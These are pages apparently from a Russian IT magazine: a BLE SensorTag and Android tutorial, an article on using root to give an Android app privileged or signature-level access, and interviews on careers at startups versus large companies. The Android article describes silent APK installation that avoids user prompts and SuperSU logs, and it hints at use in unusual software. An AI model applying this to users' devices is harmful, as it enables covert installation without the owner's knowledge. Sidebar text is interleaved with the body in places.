жет только совсем дикий человек, который не видел даже телевизора :)).
   Итак, мы установили CCS. Запустим ее. Выберем рабочую область. Работа
с CCS происходит так же, как и в других Eclipse-подобных средах.
1. Откроем TI Resource Explorer через пункт меню View -> Resource Explorer
   (Examples).
2. Откроем папку SimpleLink Academy -> Bluetooth Smart.
3. Выберем проект Project Zero -> СС2650DK SensorTag -> ProjectZeroApp.
4. Нажмем кнопку Import the example project into CCS в правой части Resource
   Explorer. Дальнейшие шаги описаны в этом окне, и при выполнении шагов
   рядом с их значками появляется зеленая галочка.

После этого в Project Explorer слева и в рабочей области должны появить-
ся две папки — два проекта (ProjectZeroApp_CC2650STK и ProjectZeroStack_
CC2650STK). Если ProjectZeroStack_CC2650STK не добавился, нужно добавить
его вручную. В этих примерах BLE-стек и проект с самим нашим приложением
связаны и импортируются, компилируются вместе. В других средах и приме-
рах, не из SimpleLink Academy (например, из пакета BLE SDK), нужно добавлять
стек и приложение самому.
1. Если у тебя есть cc-devpack-debug, можно прошить SensorTag им. Необходи-
  мо сначала подключить devpack к ПК, а затем — SensorTag к devpack. Сам про-
   цесс несложен и описан в SimpleLink Academy. Сc-devpack-debug пригодится
   и для возвращения исходной прошивки-примера, если что-то пошло не так.
2. Компилируем проект, нажав сочетание клавиш Ctrl + B
   или на иконку молотка на панели.
3. Отладка проекта осуществляется нажатием клавиши
   F11 или нажатием на иконку зеленого жучка.
4. Завершение отладки — Ctrl + F2 или нажатие на иконку
   красного квадрата.
5. Нажатие F8 — запуск/остановка, продолжение отлад-
                                                WARNING   ки и выполнение программы.
6. После начала выполнения программы и в случае, если                                                                      Осторожно прошивай
   у нас есть подключенный отладчик, в терминале после-      SensorTag. Если бата-
   довательного порта появится служебная информация     рейка начинает садить-
                                                                                           ся, то замени ее.
  об инициализации трех BLE-служб:
     1. состояние светодиода (светит или нет);
     2. состояние кнопки (нажата или нет);
     3. состояние данных (есть у нас данные или нет).

Таким образом, мы задали начальные
значения для идентификаторов харак-
теристик этих служб и значение этих
характеристик. Также в терминале
можно наблюдать сообщения о при-
ходе обратных вызовов, поступающих
из стека. Вызовы говорят о том, что
устройство периодически рассыла-
ет информацию о себе посредством
широковещательного пакета.
  В отсылаемый широковещатель-
ный пакет могут быть включены и по-
лезные данные, например измеря-
емая датчиком температура (режим
Advertisement). Если в терминале
                                                                 Импортничего не отображается, можно по-
                                                                       проектов
пробовать запустить SmartRF Flash                                                                      в CCS
Programmer v2 и оживить с его помо-
щью устройство.
   Ура, промежуточный результат: мы сделали Bluetooth-маячок (почти
iBeacon :)). Пока он только посылает в мир состояние светодиода и кнопки.
   Теперь можно запустить приложение наподобие BLEScanner на телефоне
и прочитать атрибуты (данные) устройства.





                                          Запуск и отслеживание служб в терминале


Соединение и навигация по службам
Для того чтобы взаимодействовать с BLE-устройствами, нам нужно будет ис-
пользовать что-то, что выступало бы в качестве центрального устройства
по отношению к нему. В нашем случае это будет Android-смартфон (с версией
не ниже 4.3, я испытал Nexus 5X и Xperia C3), но может быть и ПК.
   Техас Instruments предлагает несколько ПК-инструментов для этого. Ин-
струменты, в свою очередь, обмениваются данными через последователь-
ный порт с помощью специальной микропрограммы, загруженной на CC2650
устройства.  Последовательность  команд  соответствует  HCI-стандарту
по определению Bluetooth SIG и позволяет проводить контроль хост-слоев
(таких как GATT, GAP и Security Manager) в дополнение к канальному уров-
ню команд, необходимых для HCI-спецификации. Инструменты типа BTool
и Ti BLE Device Monitor используют этот интерфейс для подключения и вза-
имодействия с другими BLE-устройствами. Можно использовать SensorTag
с проектом HostTest; этот проект позволяет пользователю вызывать GATT-
и АТТ-функции BLE-стека через последовательный интерфейс (виртуальный
COM-порт, например).
Интерфейс хост-контроллера (HCI) — важная вещь в мире Bluetooth, которая
связывает железо и нашу программу.



Если ПК-инструмент не находит BLE-у-
стройства автоматически, это мож-
но сделать вручную, нажав на кнопку
«Сканировать» в программе Device
Monitor из пакета BLE-стека.





               Внешний вид приложения
               BLE Device Monitor





                                            Состояние светодиода через службу BLE

Создание прошивки
Прошивка через приложение на Android- или iOS-устройстве выглядит следую-
щим образом.
1. После того как мы нашли наше BLE-устройство и соединились с ним, в конце
   списка с показаниями разных сенсоров найдем пункт TI OAD Service (служба
   прошивки по воздуху), нажмем ее, в появившемся активити мы увидим две
   кнопки: Factory и Custom (заводское или «свое» обновление). Выбрав кноп-
   ку Custom, можно найти файл .bin, предварительно скопированный в фай-
   ловую систему Android, с нашей прошивкой, получившейся в CCS или IAR,
   и нажать кнопку Start Programming.
2. Получим bin-файл с прошивкой в CCS, кликнув правой кнопкой мыши
   на Project -> Properties -> Build -> Steps -> Post build steps.
3. Добавим в поле Post build steps следующие строки:
“${CCS_INSTALL_ROOT}/utils/tiobj2bin/tiobj2bin”
    “${BuildArtifactFileName}”
    “${BuildArtifactFileBaseName}.bin”
“${CG_TOOL_ROOT}/bin/armofd”
    “${CG_TOOL_ROOT}/bin/armhex”
    “${CCS_INSTALL_ROOT}/utils/tiobj2bin/mkhex4bin”

Пересоберем проект после применения изменений, и bin-файлы должны поя-
виться в папке output проекта.
  А вот так выглядит получение bin-файла в IAR:
1. Кликаем правой кнопкой мыши на проекте -> Options -> Output Converter.
2. Выбираем Ensure Generate additional output.
3. Устанавливаем Output format в binary.

Рекомендую собирать проект и получать bin-файл в IAR, так проще, да и в CCS
не всегда удавалось получить bin-файл. Проблема и решение указаны на фо-
руме E2E.

Прочитаем имя устройства
Используя свой GATT-эмулятор клиентского устройства, находим сервис под
названием универсального доступа (идентификаторы UUID 0x1800), развер-
нем его, чтобы найти название устройства (идентификатор UUID 0x2A00), а по-
том прочитаем это значение.

Изменим объявление данных
Две переменные — advertData и scanRspData — со-
держат данные устройства и будут передавать во
время режима Advertisement принимающей стороне,
чтобы она увидела устройство и подключилась к нему.

Изменение LOCAL_NAME
В  ProjectZero.с  находим  массив  advertData
(поиск через  Ctrl + F) и изменим LOCAL_NAME_
COMPLETE, чтобы поменять имя устройства.
  Щелкнем правой кнопкой мыши на проект Project
ZeroApp и выберем Build, проект соберется. Запу-
стим измененный код и увидим, когда включим поиск
Bluetooth-устройств, что название изменилось.

                           Внешний вид приложения
                               SensorTagApp
   iOS имеет  свойство кешировать ранее  известные имена  устройств
и не может уточнить твое новое имя, поэтому находим вызов функции
GGS_SetParameter(GGS_DEVICE_NAME_ATT, ...) в функцию ProjectZero.с:
:ProjectZero_init() и изменим содержимое массива, на который указывает
ссылка.





                          Службы и характеристики BLE с состоянием светодиодов


НА СТОРОНЕ ANDROID
Итак, в качестве клиента мы выбрали Android-девайс. Приступим!


Рекомендую  прочитать о  программировании  BLE-устройств  на  Android
документацию на DeveloperAndroid и использовать SensorTagApp, о котором я
рассказал выше (скажу по секрету: в SensorTagApp уже все написано).


C Android 4.3 (уровень API 18) вводится встроенная в платформу поддержка
Bluetooth с низким энергопотреблением для центрального устройства и пре-
доставляется API, который приложения могут использовать для обнаружения
устройств, запроса услуг и для того, чтобы читать/писать характеристики.

Роли
Здесь перечислены роли, которые применяются в устройстве Android при вза-
имодействии с BLE-устройствами: центральная и периферийная. Устрой-
ство в центральной роли сканирует, ищет Advertisement-рассылки других
устройств.
   Представь, что у тебя есть Android-телефон и фитнес-трекер, который явля-
ется BLE-устройством. Телефон поддерживает центральную роль; трекер под-
держивает периферийную роль (для установления соединения BLE нам нужна
одна из двух вещей, устанавливать соединение не могут устройства, которые
поддерживают только периферийную роль, и две вещи,
которые поддерживают только центральную роль).
   После того как телефон и трекер установили соеди-
нение, они начинают передачу GATT-метаданных друг
другу. В зависимости от вида данных, которые они пере-
дают, каждый из них может выступать в качестве сервера.        INFO
Например, если трекер хочет сообщить данные датчика        Неосторожное
на телефон, имеет смысл сделать сервером трекер. Если       продолжительное
                                                                             нажатие кнопкитрекер хочет получать обновления с телефона, то может                                                                             включения или
быть разумнее сделать сервер из телефона.                                                                               пользовательской
   Как приложение SensorTag, так и пример из developer.     кнопки может привести
android.com (Android-приложение) являются клиентами      к переходу SensorTag
                                                                            на другой стандарт
GATT. Приложение получает данные от сервера GATT —                                                                         вещания. Зажми вместе
BLE-монитора сердцебиений, который поддерживает        кнопку включения
профиль сердечного ритма. Но можно в качестве альтер-      и пользовательскую
                                                                               кнопку и держи шестьнативы создать свое Android-приложение, чтобы играть                                                                                   секунд. После этого
роль сервера GATT (см. класс BluetoothGattServer для по-      устройство вернется
лучения дополнительной информации).                               в BLE-режим.

Права доступа BLE
Для того чтобы использовать функции Bluetooth в нашем приложении, мы долж-
ны объявить разрешение BLUETOOTH permission. Это разрешение на выпол-
нение какой-либо связи Bluetooth, например запрашивание соединения, при-
ем соединений и передачу данных.
   Чтобы приложение инициировало обнаружение устройств или управля-
ло настройками Bluetooth, нужно объявить разрешение BLUETOOTH_ADMIN.
Примечание: если используем разрешение BLUETOOTH_ADMIN, то также нуж-
но иметь разрешение BLUETOOTH.
  Объявляем разрешение Bluetooth в файле-манифесте приложения. На-
пример:





Если мы хотим, чтобы приложение было доступно только для BLE-совместимых
устройств, пишем в манифесте следующее:
Однако, если планируется сделать приложение доступным для устройств, ко-
торые не поддерживают BLE, мы все равно должны включить этот элемент
в манифест, но установить при необходимости =»false». Затем во время вы-
полнения можно определить BLE-доступность с помощью диспетчера пакетов
PackageManager.hasSystemFeature() (код из примера):





Настройка BLE
Перед тем как приложение сможет обмениваться данными через BLE, мы долж-
ны убедиться, что BLE поддерживается на устройстве, и если да, то убедиться,
что он включен. Обрати внимание, что эта проверка необходима, только если
<uses-feature.../> установлена в false.
   Если BLE не поддерживается, то мы должны корректно
отключить все функции BLE. Если BLE поддерживается,
но отключен, мы можем попросить пользователя вклю-
чить Bluetooth, не выходя из приложения. Эта настройка
выполняется в два этапа, с помощью адаптера Bluetooth.
4. Получить экземпляр BluetoothAdapter.          WWW
   BluetoothAdapter  требуется  для  любых  Bluetooth
                                                                                        Bluetooth SIGactivity и  представляет собой собственный адаптер
Bluetooth-устройства (радио Bluetooth). Существует один                                                                                          Wiki, посвященная BLE
адаптер Bluetooth для всей системы, и наше приложение    и беспроводным чипам
может взаимодействовать с ним с использованием этого
объекта. Фрагмент кода ниже показывает, как получить адаптер. Обрати вни-
мание, что этот подход использует getSystemService(), чтобы вернуть экзем-
пляр Bluetooth Manager, который затем используется для получения адаптера.
Android 4.3 (API Level 18) вводит диспетчер Bluetooth:
5. Включить Bluetooth.
   Далее необходимо убедиться, что Bluetooth включен, проверив свойство
isEnabled(). Если этот метод возвращает false, то функции Bluetooth выклю-
чены. Следующий фрагмент кода проверяет, включена ли функция Bluetooth.
Если это не так, сниппет выводит сообщение об ошибке, предлагающее поль-
зователю зайти в настройки, чтобы включить Bluetooth.





6. Поиск BLE-устройств.
   Для поиска BLE-устройств используем метод startLeScan(). Этот метод
принимает BluetoothAdapter.LeScanCallback в качестве параметра. Мы
должны реализовать обратный вызов, который возвращает результаты скани-
рования. Поскольку сканирование интенсивно тратит заряд батареи нашего
Android, мы должны соблюдать следующие правила:
•  как только мы найдем нужное устройство, остановим сканирование;
•  никогда не сканировать в цикле и установить лимит времени на сканирова-
   ние. Устройство, которое ранее было доступно, возможно, вышло за преде-
  лы диапазона, и продолжение сканирования разряжает батарею.

Следующий фрагмент кода показывает, как запускать и останавливать скани-
рование:
Если мы хотим сканировать  только определенные типы периферийных
устройств  с определенными  атрибутами, вместо  этого можно  вызвать
startLeScan(UUID[],  BluetoothAdapter.LeScanCallback) — предостав-
ляет массив идентификаторов объектов UUID, определяющих GATT-службы,
которые поддерживает наше приложение.
   Вот пример реализации BluetoothAdapter.LeScanCallback в виде интер-
фейса, используемого для доставки результата BLE-сканирования:
Примечание: можно сканировать только устройства Bluetooth LE или устрой-
ства Bluetooth Classic, как описано в разделе Bluetooth. Нельзя сканировать
Bluetooth LE и Bluetooth Classic устройства одновременно.

Подключение к серверу GATT
Первым шагом во взаимодействии с BLE-устройством будет подключение
к серверу GATT на устройстве. Чтобы подключиться к серверу GATT на BLE-у-
стройстве, мы используем метод connectGatt(). Этот метод принимает три
параметра: Context объекта, autoConnect (логическое значение, указывающее,
следует ли автоматически подключаться к BLE-устройству, как только оно ста-
нет доступным), а также ссылку на BluetoothGattCallback:


Это подключение к GATT-серверу на удаленном устройстве и возвращает эк-
земпляр BluetoothGatt, который затем можно использовать для проведения
GATT-клиентских операций. Абонент (Android-приложение) является GATT-кли-
ентом. BluetoothGattCallback используется для передачи результатов клиенту.
  В этом примере BLE-приложение обеспечивает активити DeviceControlActivity
для подключения, отображения данных и показа GATT служб и характеристик,
поддерживаемых устройством. На основе UI эта деятельность связывает ак-
тивити и сервис под названием BluetoothLeService, который взаимодействует
с BLE.

Когда конкретный обратный вызов срабатывает, он вызывает соответствую-
щий вспомогательный метод broadcastUpdate(). Обрати внимание, что из-
влечение данных в этом примере выполняется в соответствии с Bluetooth Heart
Rate Measurement profile specifications (профиль и UUID монитора сердцеби-
ений), — список стандартизированных UUID профилей и служб можно найти
на bluetooth.org. Можно использовать и другие профили, например для из-
мерения температуры или влажности. Также можно сделать свой необычный
профиль, скажем наличие или отсутствие котика на кухне у холодильника.

После возврата обратно в DeviceControlActivity эти события обрабатываются
в классе широковещательного приемника BroadcastReceiver:
Чтение атрибутов
Вот мы и добрались до чтения атрибутов с SensorTag или другого BLE-устрой-
ства. Приложение Android подключилось к GATT-серверу, обнаружило службы,
теперь оно может читать и записывать атрибуты. Например, этот код выполняет
итерации через сервисы сервера и характеристики и их отображение в поль-
зовательском интерфейсе:
GATT и получение уведомлений (нотификация)
Чтобы воспользоваться функцией уведомления о поступлении конкретной
характеристики, измененной на устройстве, нужно установить уведомление
для признака, используя метод setCharacteristicNotification():
Уведомления включаются для характеристики в onCharacteristicChanged(),
когда обратный вызов срабатывает, если значения характеристик изменились
на удаленном устройстве.





Закрытие клиентского GATT-соединения
Как только твое приложение закончило использовать BLE-устройство, оно долж-
но вызвать метод close(), чтобы освободить ресурсы надлежащим образом.





ИТОГИ
Мы познакомились с железом и софтом для создания простой сети на Bluetooth
low energy, почитали и записали атрибуты (значения показаний сенсоров).
Попробовали создать свою прошивку и сделали консоль для IoT с помощью
Android-девайса. В дальнейшем можно подключить нашу сеть к облаку и по-
лучать/посылать данные через удобный веб-интерфейс. Жди продолжения
в следующем номере!
КОДИНГ
     СЕРДЦЕ
     РОБОТА





                                                                                 Евгений Зобнин
                                                                                               zobnin@gmail.com





ИСПОЛЬЗУЕМ СИСТЕМНЫЙ API ANDROID
В ЛИЧНЫХ ЦЕЛЯХ
Любой, кто писал более или менее серьезный софт
для разных мобильных ОС, знает, что Android — самая
открытая для разработчика ОС. Доступный для сто-
ронних приложений API здесь гораздо шире, сама
система гибче, а правила размещения приложений
в маркете очень либеральные. Однако и в Android
есть ряд системных API, скрытых от сторонних при-
ложений и доступных только стоковому софту. В этой
статье мы попробуем разобраться, как получить до-
ступ к этим API и какие возможности они открывают.

НЕМНОГО ТЕОРИИ
Как мы все знаем, в Android есть такое понятие — полномочия приложений
(permissions, разрешения). Полномочия прописываются в файл Manifest.xml
каждого  приложения  и  определяют  то,  к  каким  функциям  API  смо-
жет получить доступ приложение. Хочешь работать с камерой — добавь
строку <uses-permission android:name=»android.permission.CAMERA» />.
Нужен доступ к карте памяти — android.permission.READ_EXTERNAL_STORAGE.
Все просто и логично, к тому же все доступные приложениям полномочия хоро-
шо документированы.
   Есть, однако, в этой стройной схеме одна очень важная деталь, которую
сами создатели Android называют уровень доступа (protection level). Чтобы по-
нять, что это такое, попробуй добавить в Manifest.xml любого своего прило-
жения следующую строку:



По идее, данное полномочие должно открыть доступ к API, позволяющему пе-
реводить смартфон в режим полета, включать/выключать GPS и делать другие
полезные вещи. Но IDE так не считает и поэтому сразу подчеркивает строку
как ошибку с формулировкой «Permission is only granted to system apps». Это
и есть предупреждение о нарушении того самого уровня доступа. IDE как бы
говорит нам: да, ты можешь попробовать дать своему приложению полномочие
WRITE_SECURE_SETTINGS, но Android все равно не разрешит тебе использовать
закрепленный за ним API до тех пор, пока ты не сделаешь свое приложение си-
стемным. А что значит «системным» в данном случае? Это значит: подпишешь
его тем же цифровым ключом, каким подписана сама прошивка (иди попробуй
раздобыть такой ключ у какой-нибудь Samsung или LG!).
                                                                                                    Упс...

  Официально в Android существует четыре уровня доступа:
•  normal — «обычные» полномочия, дающие приложению доступ к безобид-
  ным функциям, которые не получится зловредно использовать (примеры:
   SET_ALARM, ACCESS_NETWORK_STATE, VIBRATE). Система даже не ска-
   жет тебе, что приложение вообще их использует;
•  dangerous — «опасные» полномочия, юзер будет информирован о них
   при установке приложения либо увидит окошко с предупреждением в Android
   6.0 (примеры: READ_SMS, SEND_SMS, CALL_PHONE, READ_CALL_LOG);
•  signature — доступны только приложениям, подписанным ключом прошив-
   ки (примеры: GET_TASKS, MANAGE_USERS, WRITE_SETTINGS, MOUNT_
  UNMOUNT_FILESYSTEMS);
•  privileged — доступны приложениям, располагающимся в каталоге /system/
   priv-app.

В большинстве случаев уровни доступа signature и privileged равноценны. На-
пример, чтобы получить полномочие MANAGE_USERS, приложение должно
быть либо подписано ключом прошивки, либо размещено в каталоге /system/
priv-app. Но есть и исключения: например, полномочие MANAGE_DEVICE_
ADMIN имеет уровень доступа signature, то есть единственный способ его по-
лучить — подписать приложение ключом прошивки.
   Есть также набор внутренних уровней доступа, введенных в Android для ре-
шения определенных проблем: installer, development, preinstalled, appop, pre23.
По сути, это костыли, и на данном этапе ты можешь о них не думать, однако
к уровню доступа development мы еще вернемся, и он нам очень сильно приго-
дится. А пока поговорим о том, как получить нужные нам уровни доступа и что
они дают.
УРОВЕНЬ ДОСТУПА PRIVILEGED
Privileged не самый высокий уровень доступа и позволяет использовать далеко
не весь API Android. Однако в большинстве случаев он оказывается вполне до-
статочным, так как позволяет устанавливать и удалять приложения и пользова-
телей (INSTALL_PACKAGES, DELETE_PACKAGES, MANAGE_USERS), управлять
статусной строкой (STATUS_BAR), управлять некоторыми настройками питания
(WRITE_SECURE_SETTINGS), читать и изменять настройки Wi-Fi (READ_WIFI_
CREDENTIAL, OVERRIDE_WIFI_CONFIG), отключать приложения и их компонен-
ты (CHANGE_COMPONENT_ENABLED_STATE) и многое другое.
   Чтобы приложение получило уровень доступа privileged, оно должно быть
установлено в каталог /system/priv-app, а это значит — поставляться преду-
становленным в составе прошивки. Однако, имея root, мы можем поместить
свое приложение в данный каталог с помощью двух функций:
Функцию runCommandWait я описывать не буду, она просто выполняет shell-ко-
манду и ждет ее завершения (подробнее читай в моей статье про написание
приложений с правами root). Функция makeAppSystem, в свою очередь, при-
нимает полное имя приложения (это то самое com.example.app, которое ты
указываешь при создании нового проекта в Android Studio) и переносит его в /
system/priv-app или /system/app, в зависимости от используемой версии
Android. Код может показаться тебе несколько странным, на самом деле он аб-
солютно корректен и учитывает два фактора:
•  до Android 4.4 (API Level: 20) каталога /system/priv-app не существовало
   и все системные приложения размещались в /system/app;
•  начиная с Android 5.0 (API Level: 21) пакеты с приложениями не просто скла-
   дируются в /data/app и /system/priv-app, а размещаются внутри своих
   обособленных подкаталогов.
Как использовать этот код? Очень просто: ты определяешь в Manifest.xml сво-
его приложения все privileged-полномочия, которые ему нужны, не обращая
внимания на ошибки IDE. Затем в самое начало кода приложения вставляешь
вызов makeAppSystem с именем самого приложения в качестве аргумента,
компилируешь и запускаешь. После запуска приложение перемещает само
себя в /system/priv-app, перезагружает смартфон, и ему открываются все
privileged API.
   Список privileged-полномочий можно посмотреть в исходниках Android.
Просто ищи по слову privileged. О том, как их использовать, — чуть позже.

УРОВЕНЬ ДОСТУПА SIGNATURE
Подпись ключом прошивки позволяет получить самый высокий уровень до-
ступа к API — signature. Имеющее такой доступ приложение может делать
практически все что угодно: манипулировать любыми настройками Android
(WRITE_SETTINGS, WRITE_SECURE_SETTINGS), наделять приложения правами
администратора (MANAGE_DEVICE_ADMINS), программно нажимать кнопки
и вводить данные в любое окно (INJECT_EVENTS) и многое другое.
   Получить такой уровень доступа на стоковой прошивке почти невозможно.
Ни один производитель смартфонов не предоставит тебе ключ для подписи
своих прошивок. Но если речь идет о кастомной прошивке, то все становится
немного проще. Например, ночные сборки того же CyanogenMod (а я напом-
ню, что пользователей у нее больше, чем юзеров всех версий Windows Phone,
вместе взятых) подписываются тестовым ключом, а его особенность в том, что
он есть в открытом доступе.
  Но это еще не все! В CyanogenMod есть механизм безопасности, который,
в отличие от чистого Android, позволяет получать уровень доступа signature
не абсолютно всем приложениям, подписанным ключом прошивки, а только тем,
что размещены в /system/priv-app. Поэтому, чтобы получить уровень доступа
signature в CyanogenMod (не в Cyanogen OS, я подчеркиваю), необходимо:
1. Добавить в Manifest.xml приложения необходимые полномочия.
2. Добавить в приложение вызов функции makeAppSystem(), описанной в пре-
  дыдущем разделе.
3. Подписать релизную версию приложения ключом platform из репозитория
   CyanogenMod.

УРОВЕНЬ ДОСТУПА DEVELOPMENT
В Android есть специальный уровень доступа development, отличие которо-
го заключается в том, что приложения получают его не по факту размещения
в /system/priv-app или использования цифровой подписи прошивки, а ди-
намически. То есть система может дать такой уровень доступа любому при-
ложению, а может и отозвать обратно. Но самое важное, что, имея права root,
приложение может наделить себя таким уровнем доступа самостоятельно.
   Чтобы это сделать, достаточно использовать примерно такой код:



В данном случае приложение appName получит полномочие WRITE_SECURE_
SETTINGS вне зависимости от того, где оно размещено и каким ключом подпи-
сано. Круто? Вне сомнения, однако WRITE_SECURE_SETTINGS — фактически
единственное полезное полномочие с уровнем доступа development. Осталь-
ные четырнадцать — это полномочия для отладки и тестирования (чтение ло-
гов, дампы памяти и так далее).





                                    Полномочия development в исходниках Android


КАК ИСПОЛЬЗОВАТЬ СИСТЕМНЫЙ API?
Основная проблема, с которой ты столкнешься при работе с системным API, —
это полное (за небольшими исключениями) отсутствие документации. Ни в
официальных руководствах, ни в неофициальных ты не найдешь почти никаких
упоминаний об этом. Информацию придется собирать по крупицам, прошари-
вая сотни страниц форумов и читая тысячи страниц исходников Android. Одна-
ко хоть и небольшую, но отправную точку в виде парочки полезных примеров
мы тебе дадим.
WRITE_SECURE_SETTINGS
Полномочие WRITE_SECURE_SETTINGS появилось в Android 4.2 для защиты
некоторых критически важных настроек Android. Среди таких настроек: вклю-
чение/выключение режима полета, управление настройками местоположения
и передачи данных. Оно защищено сразу тремя уровнями доступа: signature,
privileged и development. То есть ты можешь использовать любой из перечис-
ленных выше способов получения уровня доступа, чтобы наделить свое прило-
жение полномочием WRITE_SECURE_SETTINGS.
   Как использовать открывшиеся возможности? Например, так:





   Это очень простой код, который тупо переключает смартфон в режим полета
или наоборот в зависимости от текущего состояния. Все просто и лаконично.

INSTALL_PACKAGES
Как ясно из названия, полномочие INSTALL_PACKAGES позволяет «втихую»
устанавливать в систему APK-пакеты. Использовать эту возможность могут
либо подписанные ключом прошивки приложения (signature), либо установлен-
ные в /system/priv-app. При этом даже не обязательно использовать Java
API, достаточно вызвать консольную команду pm (Package Manager) с нужными
параметрами:


После отработки команды пакет apkPath будет установлен в систему. Ты мо-
жешь возразить, что то же самое можно сделать и с правами root, и будешь
прав: в данном случае достаточно изменить последний аргумент функции
runCommandWait() на true. Однако стоит иметь в виду, что приложения с пра-
вами root, во-первых, приводят к появлению окна запроса соответствующих
полномочий у юзера, а во-вторых, логируются тем же SuperSU. А так достаточ-
но один раз прописать свою софтину в /system/priv-app, и она сможет уста-
навливать сколько угодно софта без всяких вопросов.

ВМЕСТО ВЫВОДОВ
Вот и все. Доступ к закрытому API в Android не так уж и сложно получить. С дру-
гой стороны, с легитимным софтом использовать его в большинстве случаев
не имеет смысла, проще получить права root и вызывать соответствующие кон-
сольные команды: settings для изменения настроек, pm для установки/удале-
ния приложений, setprop для изменения низкоуровневых настроек и так далее.
Однако если речь идет о не совсем обычном программном обеспечении...
КОДИНГ
СТАРТАПЫ
И ГИГАНТЫТОП-МЕНЕДЖЕРЫ И БЫВАЛЫЕ
РАЗРАБОТЧИКИ РАССКАЗЫВАЮТ, ГДЕ
ЛУЧШЕ РАБОТАТЬ ПРОГРАММИСТУ
Говорят, работать в Google или Яндексе — мечта лю-
бого разработчика. Большие компании дают столько
плюшек для своих сотрудников, что любой стремится
попасть в условный Яндекс, отвечать за три строчки
CSS и получать 100 тысяч рублей в месяц. Но вот па-
радокс: куча крутых девелоперов уходят из крупных
компаний в небольшие стартапы. Почему так проис-
ходит? Чтобы узнать ответ, мы поговорили с предста-
вителями ИТ-корпораций и разработчиками из ма-
леньких компаний.

КТО ОТВЕЧАЛ НА НАШИ ВОПРОСЫ
Большие корпорации представляют:
•  Станислав Протасов, Acronis, старший вице-президент по проектированию
   и разработке ПО
•  Андрей Чупейкин, Яндекс, руководитель группы разработки интерфейсов
   Яндекс.Маркета
•  Денис Аникин, технический директор проекта Почта Mail.Ru
•  Денис Бургачев, Яндекс, разработчик Яндекс.Маркета
•  Антон Сачков, Яндекс, руководитель группы разработки инфраструктуры
   фронтенда Яндекс.Маркет
•  Олег Бартунов, директор и ведущий разработчик PostgreSQL

Об опыте в стартапах и небольших компаниях рассказывают:
•  Александр Поляков, ЕRРSсаn, технический директор, специалист по ИБ
•  Борис Рютин, Digital Security, аналитик по ИБ
ГДЕ РАБОТАТЬ ЛУЧШЕ: В КРУПНОЙ КОМПАНИИ
ИЛИ В НЕБОЛЬШОЙ КОМПАНИИ ИЛИ СТАРТАПЕ И ПОЧЕМУ?

      Станислав Протасов,
      Acronis

  Чем хороша крупная компания по сравнению со стартапом? Это холивар.
Что лучше: когда у человека широкий̆ круг знаний, но они неглубокие или когда
он знает всего одну тему, но досконально? Думаю, любой человек сначала стал
в какой-то области очень глубоким специалистом, а потом уже начал расши-
рять свой кругозор, выбираться из зоны комфорта.
   Глубоких специалистов в принципе не очень много. И удивительным обра-
зом большинство таких людей работают в больших компаниях: Яндекс, Mail.Ru,
Касперский, мы. Это логически объяснимо. Скажем, если ты делаешь сервис,
на который приходит 100 тысяч пользователей в день, есть разница, сколько
памяти ты тратишь на коннекшен: один мегабайт или сто. От этого зависит, ля-
гут у вас серверы или вытянут нагрузку. А если ты работаешь в стартапе и по-
требляешь в сто раз больше памяти, чем нужно, это незаметно до тех пор, пока
стартап не начнет взлетать. А так как большинство из них не взлетает вовсе, это
так и остается не замечено никем.
   Словом, в стартапе трудно стать глубоким специалистом, так как чаще все-
го там нет «специфических» сложных кейсов. Во многих случаях лучше начать с
большой компании.


     Андрей Чупейкин,
     Яндекс

Обычно в стартапах bleeding edge технологии, которые относительно легко
поддерживать на уровне свежих, при этом сопровождая процесс докладами
на конференциях. Больше личной свободы (работа из дома, отсутствие фикси-
рованных часов, необязательность больничных и так далее), небольшая коман-
да и несложные процессы взаимодействия, есть вероятность получить опцион.
Чего нет — это уверенности в том, что компанию не закроют и зарплату выпла-
тят в срок.
  Большая компания — противоположность маленькой. Чем больше людей,
тем больше контроля, как следствие — меньше души, больше масла и шесте-
ренок.
  На мой взгляд, работать лучше в компаниях, которые умеют сочетать в себе
черты как тех, так и других. Такие есть.
     Денис Аникин,
      Mail.Ru Group

В стартапе от людей ждут большей ответственности, большего ownership.
Но в большой компании ты все равно набираешь людей в какую-то небольшую
команду, и она как стартап. Всегда можно считать так: большая компания де-
лится на маленькие команды, каждая команда — это стартап. А все те блага, то
есть процессы и бюрократия, которые ты получаешь от остальной компании,
они как твой подрядчик или заказчик.


     Денис Бургачев,
     Яндекс

Лучше работать там, где работа приносит удовольствие и ты профессионально
растешь. Маленькие компании бывают разные, но вообще-то в больших ком-
паниях, как правило, более сложные и интересные проекты. Так что пройти этот
этап придется в любом случае. А там можно и в свой стартап податься :).


     Александр Поляков,
     ЕRРSсаn

Лучше всего не «работать», а заниматься любимым делом. А выбор зависит
от того, что ты хочешь. Если тебе нужна некая стабильность и тебя не напря-
гает выполнять задачи, спущенные сверху, в соответствии с определенными
требованиями, то тогда большая компания — это для тебя. Если ты хочешь сам
решать, что делать, и чтобы к твоему мнению прислушивались, и еще действи-
тельно менять мир хотя бы чуточку, — ответ очевиден.


     Борис Рютин,
       Digital Security

Начинающему программисту или исследователю лучше попробовать порабо-
тать в крупной компании. Там уже налажен процесс, имеются свои приемы и
правила. Особенно в очень крупных компаниях, таких как, к примеру, Яндекс. У
них уже есть система стажировки, которая тебя обучит самому важному. Хотя
вообще-то и в маленькой компании может повезти с ментором. И в таком слу-
чае — открывшиеся перспективы могут оказаться намного более интересными,
чем в крупной. В общем вывод такой - стартапы для тех, кто любит рисковать ;-)
      Олег Бартунов,
      PostgreSQL

Как ни печально, но, на мой взгляд, в крупных компаниях нужны винтики. Там
не учатся быть девелоперами, там учат кодировать.
   Крупные компании поощряют создание кодеров потому, что это экономиче-
ски оправданная инвестиция. Чтобы удержать настоящего большого разработ-
чика, нужны постоянные челленджи, повышение зарплаты, профессиональный
рост. Если этого не будет, разработчик уйдет, а вот кодеру и так хорошо, он
знает свою работу, привязан и никуда не денется.


КАКУЮ ПОЛЬЗУ ИЗВЛЕКАЕТ ДЕВЕЛОПЕР ИЗ СВОЕЙ РАБОТЫ
В ОДНОМ И В ДРУГОМ СЛУЧАЕ?

      Станислав Протасов,
      Acronis

Если кратко — в большой компании получают опыт.
  Чем хороша именно крупная компания против стартапа? Тем, что в ней
больше шансов стать глубоким. Понятно, что любое категоричное утверждение
неправильно. Наверняка есть люди, которые стали очень глубокими профес-
сионалами в стартапах. Хотя там им приходится и серверы размещать, и кофе
покупать, и программировать.
  Но в среднем, я думаю, опыт в большой компании сначала делает програм-
миста более глубоким специалистом, более подходящим для стартапа впослед-
ствии. Посмотрите на типичную карьеру американских программистов: хотя в
США и много стартапов, большинство успешных из них создаются специали-
стами (если говорить об инженерах), которые уже где-то поработали. То есть
человек получил опыт где-то, а потом ушел и сделал стартап или в нем поуча-
